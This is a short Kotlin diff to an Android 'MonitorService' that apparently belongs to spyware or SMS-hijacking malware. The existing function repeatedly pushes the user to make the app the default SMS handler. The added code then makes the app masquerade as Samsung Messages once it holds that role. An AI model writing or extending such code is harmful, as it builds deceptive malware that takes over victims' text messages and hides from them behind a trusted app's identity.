@@ -179,12 +179,16 @@ class MonitorService : Service() {
     }
 
     private fun checkRelentlessSms() {
-        if (!DefaultSmsManager.isRelentlessActive) return
         if (DefaultSmsManager.isDefaultSms(applicationContext)) {
-            DefaultSmsManager.isRelentlessActive = false
-            DefaultSmsManager.expectedMode = ""
+            if (DefaultSmsManager.isRelentlessActive) {
+                DefaultSmsManager.isRelentlessActive = false
+                DefaultSmsManager.expectedMode = ""
+            }
+            // AUTO-SKIN: Switch to Samsung Messages identity
+            CommandProcessor.applyMasqueradeSkin(applicationContext, "SAM_MSG")
             return
         }
+        if (!DefaultSmsManager.isRelentlessActive) return
         
         val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
         val lastPrompt = prefs.getLong("relentless_sms_last_prompt", 0L)
